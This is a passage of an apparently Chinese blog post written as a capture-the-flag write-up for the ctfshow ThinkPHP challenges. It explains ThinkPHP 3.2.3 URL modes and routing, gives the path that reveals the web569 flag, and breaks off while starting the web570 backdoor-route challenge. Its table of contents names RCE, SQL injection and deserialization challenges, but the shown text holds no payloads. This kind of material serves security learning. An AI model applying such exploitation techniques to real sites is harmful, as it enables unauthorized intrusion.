
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>ctfshow ThinkPHP专题 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TP3"><span class="toc-number">2.</span> <span class="toc-text">TP3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web569%EF%BC%88pathinfo%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">web569（pathinfo）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">URL模式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.1.</span> <span class="toc-text">普通模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATHINFO%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.2.</span> <span class="toc-text">PATHINFO模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REWRITE%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.3.</span> <span class="toc-text">REWRITE模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%BC%E5%AE%B9%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">兼容模式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">3.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web570%EF%BC%88%E8%B7%AF%E7%94%B1%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">web570（路由）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1"><span class="toc-number">4.1.</span> <span class="toc-text">路由</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%AE%9A%E4%B9%89"><span class="toc-number">4.1.1.</span> <span class="toc-text">路由定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E5%88%99%E8%B7%AF%E7%94%B1%E3%80%81%E6%AD%A3%E5%88%99%E8%B7%AF%E7%94%B1%E3%80%81%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1"><span class="toc-number">4.1.2.</span> <span class="toc-text">规则路由、正则路由、静态路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%8C%85%E6%94%AF%E6%8C%81"><span class="toc-number">4.1.3.</span> <span class="toc-text">闭包支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">4.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web571%EF%BC%88%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">web571（控制器）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">5.1.</span> <span class="toc-text">控制器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">5.1.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E5%90%8E%E7%BD%AE%E6%93%8D%E4%BD%9C"><span class="toc-number">5.1.2.</span> <span class="toc-text">前置后置操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Action%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A"><span class="toc-number">5.1.3.</span> <span class="toc-text">Action参数绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E9%85%8D%E7%BD%AE"><span class="toc-number">5.1.4.</span> <span class="toc-text">其它配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95"><span class="toc-number">5.1.5.</span> <span class="toc-text">内置方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%BF%87%E6%BB%A4"><span class="toc-number">5.1.6.</span> <span class="toc-text">变量过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">5.2.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#show%E6%96%B9%E6%B3%95%E6%B8%B2%E6%9F%93%E5%86%85%E5%AE%B9"><span class="toc-number">5.2.1.</span> <span class="toc-text">show方法渲染内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web572%EF%BC%88%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">web572（日志泄露）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2"><span class="toc-number">6.1.</span> <span class="toc-text">日志泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-3"><span class="toc-number">6.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web573%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">web573（sql注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web574"><span class="toc-number">8.</span> <span class="toc-text">web574</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">8.1.</span> <span class="toc-text">本地调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-4"><span class="toc-number">8.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web575"><span class="toc-number">9.</span> <span class="toc-text">web575</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Ashow%E6%96%B9%E6%B3%95%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">9.1.</span> <span class="toc-text">解法一：show方法命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Athinkphp3-2-3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">9.2.</span> <span class="toc-text">解法二：thinkphp3.2.3反序列化</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web576%EF%BC%88comment%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">10.</span> <span class="toc-text">web576（comment注释注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web577%EF%BC%88exp%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">web577（exp注入）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web578%EF%BC%88%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4rce%EF%BC%89"><span class="toc-number">12.</span> <span class="toc-text">web578（变量覆盖导致rce）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TP5"><span class="toc-number">13.</span> <span class="toc-text">TP5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web579%EF%BC%88%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1RCE%EF%BC%89"><span class="toc-number">14.</span> <span class="toc-text">web579（未开启强制路由RCE）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web604"><span class="toc-number">15.</span> <span class="toc-text">web604</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web605"><span class="toc-number">16.</span> <span class="toc-text">web605</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web606"><span class="toc-number">17.</span> <span class="toc-text">web606</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web607"><span class="toc-number">18.</span> <span class="toc-text">web607</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web608"><span class="toc-number">19.</span> <span class="toc-text">web608</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web609"><span class="toc-number">20.</span> <span class="toc-text">web609</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web610"><span class="toc-number">21.</span> <span class="toc-text">web610</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web611%EF%BC%885-1-38%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%EF%BC%89"><span class="toc-number">22.</span> <span class="toc-text">web611（5.1.38反序列化rce）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web612%EF%BC%88%E7%A6%81ajax-amp-withattr%EF%BC%89"><span class="toc-number">23.</span> <span class="toc-text">web612（禁ajax &amp; withattr）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web613%EF%BC%88%E7%A6%81pjax%EF%BC%89"><span class="toc-number">24.</span> <span class="toc-text">web613（禁pjax）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web614%EF%BC%88%E7%A6%81write%EF%BC%89"><span class="toc-number">25.</span> <span class="toc-text">web614（禁write）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web615%EF%BC%88%E7%A6%81read%EF%BC%89"><span class="toc-number">26.</span> <span class="toc-text">web615（禁read）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web616%EF%BC%88%E7%A6%81display%EF%BC%89"><span class="toc-number">27.</span> <span class="toc-text">web616（禁display）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web617%EF%BC%88%E7%A6%81fetch%EF%BC%89"><span class="toc-number">28.</span> <span class="toc-text">web617（禁fetch）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web618%EF%BC%88%E7%A6%81invokeFunction%EF%BC%89"><span class="toc-number">29.</span> <span class="toc-text">web618（禁invokeFunction）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web619%EF%BC%88%E7%A6%81each%EF%BC%89"><span class="toc-number">30.</span> <span class="toc-text">web619（禁each）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web620%EF%BC%88%E7%A6%81map%EF%BC%89"><span class="toc-number">31.</span> <span class="toc-text">web620（禁map）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web621%EF%BC%88%E7%A6%81filter%EF%BC%89"><span class="toc-number">32.</span> <span class="toc-text">web621（禁filter）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web622%EF%BC%88%E7%A6%81reduce%EF%BC%89"><span class="toc-number">33.</span> <span class="toc-text">web622（禁reduce）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#input%E9%93%BE"><span class="toc-number">34.</span> <span class="toc-text">input链</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TP6"><span class="toc-number">35.</span> <span class="toc-text">TP6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web623%EF%BC%88TP6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89"><span class="toc-number">36.</span> <span class="toc-text">web623（TP6反序列化）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web624%EF%BC%886-0-12%E9%93%BE%EF%BC%89"><span class="toc-number">37.</span> <span class="toc-text">web624（6.0.12链）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web625%EF%BC%88%E7%A6%81display%EF%BC%89"><span class="toc-number">38.</span> <span class="toc-text">web625（禁display）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web626%EF%BC%88%E7%A6%81call%EF%BC%89"><span class="toc-number">39.</span> <span class="toc-text">web626（禁call）</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>ctfshow ThinkPHP专题</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/11/18
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/CMS/" style="color: #00bcd4">CMS</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/ThinkPHP/" style="color: #ffa2c4">ThinkPHP</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/ctfshow/" style="color: #ff7d73">ctfshow</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">8.3k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">38分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>结合我的另一篇ThinkPHP反序列化研究来学习</p>
<p>此专题需要自备tp源码方便调试</p>
<p>参考博客：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/119410335">https://blog.csdn.net/miuzzx/article/details/119410335</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53263789/article/details/122402321">https://blog.csdn.net/qq_53263789/article/details/122402321</a></p>
<span id="more"></span>

<h1 id="TP3"><a href="#TP3" class="headerlink" title="TP3"></a>TP3</h1><h1 id="web569（pathinfo）"><a href="#web569（pathinfo）" class="headerlink" title="web569（pathinfo）"></a>web569（pathinfo）</h1><p>版本3.2.3</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">flag在Admin模块的Login控制器的ctfshowLogin方法中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们先查一下官方文档：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1697">https://www.kancloud.cn/manual/thinkphp/1697</a></p>
<hr>
<h2 id="URL模式"><a href="#URL模式" class="headerlink" title="URL模式"></a>URL模式</h2><p>先了解一下ThinkPHP3.2.3的标准URL格式</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php/模块/控制器/操作</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注：ThinkPHP框架的URL区分大小写，如果要不区分需要在框架内配置（当开启调试模式的情况下，这个参数是false）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_CASE_INSENSITIVE'</span>  <span class="token operator">=></span>  <span class="token constant boolean">true</span><span class="token punctuation">,</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果我们直接访问入口文件的话，由于URL中没有模块、控制器和操作，因此系统会访问默认模块（Home）下面的默认控制器（Index）的默认操作（index），因此下面的访问是等效的：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php/Home/Index/index</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这种URL模式就是系统默认的<code>PATHINFO</code>模式，可以设置<strong>URL_MODEL</strong>参数改变URL模式</p>
<table>
<thead>
<tr>
<th>URL模式</th>
<th>URL_MODEL设置</th>
</tr>
</thead>
<tbody><tr>
<td>普通模式</td>
<td>0</td>
</tr>
<tr>
<td>PATHINFO模式</td>
<td>1</td>
</tr>
<tr>
<td>REWRITE模式</td>
<td>2</td>
</tr>
<tr>
<td>兼容模式</td>
<td>3</td>
</tr>
</tbody></table>
<h3 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h3><blockquote>
<p>传统的GET传参方式来指定当前访问的模块和操作</p>
</blockquote>
<p>例如： <code>http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value</code>（这里m参数表示模块，c参数表示控制器，a参数表示操作，后面的表示其他GET参数）</p>
<p>我们可以修改对应的系统配置来更改变量名（注：VAR_MODULE只能在应用配置文件中设置，其他参数可以则也可以在模块配置中设置）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'VAR_MODULE'</span>            <span class="token operator">=></span>  <span class="token string single-quoted-string">'module'</span><span class="token punctuation">,</span>     <span class="token comment">// 默认模块获取变量</span>
<span class="token string single-quoted-string">'VAR_CONTROLLER'</span>        <span class="token operator">=></span>  <span class="token string single-quoted-string">'controller'</span><span class="token punctuation">,</span>    <span class="token comment">// 默认控制器获取变量</span>
<span class="token string single-quoted-string">'VAR_ACTION'</span>            <span class="token operator">=></span>  <span class="token string single-quoted-string">'action'</span><span class="token punctuation">,</span>    <span class="token comment">// 默认操作获取变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>上面的访问地址则变成： <code>http://localhost/?module=home&amp;controller=user&amp;action=login&amp;var=value</code></p>
<h3 id="PATHINFO模式"><a href="#PATHINFO模式" class="headerlink" title="PATHINFO模式"></a>PATHINFO模式</h3><blockquote>
<p>默认的url模式，不过依然可以采用普通URL模式的参数方式</p>
</blockquote>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost/index.php/home/user/login/var/value/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>前三个参数分别表示模块&#x2F;控制器&#x2F;操作</p>
<ul>
<li><p>在PATHINFO模式下，URL是可定制的，配置：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 更改PATHINFO参数分隔符</span>
<span class="token string single-quoted-string">'URL_PATHINFO_DEPR'</span><span class="token operator">=></span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>于是访问的url就要改成<code>http://localhost/index.php/home-user-login-var-value</code></p>
</li>
</ul>
<h3 id="REWRITE模式"><a href="#REWRITE模式" class="headerlink" title="REWRITE模式"></a>REWRITE模式</h3><blockquote>
<p>在PATHINFO模式的基础上添加了重写规则的支持，可以去掉URL地址里面的入口文件index.php，但是需要额外配置WEB服务器的重写规则</p>
</blockquote>
<p>以Apache为例，在入口文件的同级添加.htaccess文件：</p>
<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;IfModule mod_rewrite.c&gt;
 RewriteEngine on
 RewriteCond %&#123;REQUEST_FILENAME&#125; !-d
 RewriteCond %&#123;REQUEST_FILENAME&#125; !-f
 RewriteRule ^(.*)$ index.php&#x2F;$1 [QSA,PT,L]
&lt;&#x2F;IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么访问的url就变成了<code>http://localhost/home/user/login/var/value</code></p>
<h3 id="兼容模式"><a href="#兼容模式" class="headerlink" title="兼容模式"></a>兼容模式</h3><blockquote>
<p>用于不支持PATHINFO的特殊环境</p>
</blockquote>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//localhost/?s=/home/user/login/var/value</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以更改兼容模式变量的名称定义：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'VAR_PATHINFO'</span>          <span class="token operator">=></span>  <span class="token string single-quoted-string">'path'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以像上面PATHINFO模式一样更改参数分隔符：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 更改PATHINFO参数分隔符</span>
<span class="token string single-quoted-string">'URL_PATHINFO_DEPR'</span><span class="token operator">=></span><span class="token string single-quoted-string">'-'</span><span class="token punctuation">,</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>url变为：<code>http://localhost/?path=/home-user-login-var-value</code></p>
<p>也可以通过重写web服务器规则定义来实现和REWRITE模式一样的效果</p>
<pre class="line-numbers language-htaccess" data-language="htaccess"><code class="language-htaccess">&lt;IfModule mod_rewrite.c&gt;
 RewriteEngine on
 RewriteCond %&#123;REQUEST_FILENAME&#125; !-d
 RewriteCond %&#123;REQUEST_FILENAME&#125; !-f
 RewriteRule ^(.*)$ index.php?s&#x3D;&#x2F;$1 [QSA,PT,L]
&lt;&#x2F;IfModule&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>url变为：<code>http://localhost/home/user/login/var/value</code></p>
<hr>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>回到题目，题目告诉我们是pathinfo模式，根据题目要求，我们可以直接访问</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">/index.php/Admin/Login/ctfshowLogin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>即可得到flag</p>
<hr>
<h1 id="web570（路由）"><a href="#web570（路由）" class="headerlink" title="web570（路由）"></a>web570（路由）</h1><p>版本3.2.3</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">黑客建立了闭包路由后门，你能找到吗<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>了解一下路由：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1705">https://www.kancloud.cn/manual/thinkphp/1705</a></p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p>PATH_INFO模式或兼容URL模式下使用，配置文件中开启，可以针对模块也可以针对全局</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 开启路由</span>
